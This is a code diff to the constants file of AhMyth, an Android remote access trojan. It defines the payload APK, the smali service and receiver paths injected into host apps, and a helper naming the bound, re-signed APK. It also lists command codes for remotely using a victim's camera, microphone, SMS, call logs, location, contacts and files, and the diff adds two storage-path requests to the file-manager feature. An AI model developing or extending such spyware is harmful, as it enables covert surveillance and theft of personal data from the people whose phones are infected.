@@ -1,6 +1,5 @@
 const path = require('path');
 
-
 //---------------------App Controller Vars----------------------------------
 exports.apkName = 'Ahmyth.apk';
 exports.apkSourceName = 'Ahmyth';
@@ -16,7 +15,7 @@ exports.outputLogsPath = 'Logs';
 exports.logColors = { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" };
 exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 };
 exports.defaultPort = 42474;
-exports.IOSocketPath = 'smali' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'e.smali';
+exports.IOSocketPath = 'smali' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep +'e.smali';
 exports.ahmythService = 'ahmyth.mine.king.ahmyth.MainService';
 exports.ahmythReceiver = 'ahmyth.mine.king.ahmyth.MyReceiver';
 exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
@@ -136,15 +135,22 @@ exports.checkboxMap = {
   ],
 };
 
+//---------------------App Controller Functs--------------------------------
+exports.getApkNameBoundSigned = function (apkFolder) {
+  return path.basename(apkFolder) + "-aligned-debugSigned.apk";
+};
+
+
 //---------------------Lab Controller Vars----------------------------------
 exports.order = 'order';
 exports.orders = {
   camera: 'x0000ca',
   fileManager: 'x0000fm',
+  externalStoragePathRequest: 'getExternalStoragePath', // Part of the File Manager Feature
+  sdCardPathRequest: 'getSDCardPath', // Part of the File Manager feature
   calls: 'x0000cl',
   sms: 'x0000sm',
   mic: 'x0000mc',
   location: 'x0000lm',
   contacts: 'x0000cn',
-
 }
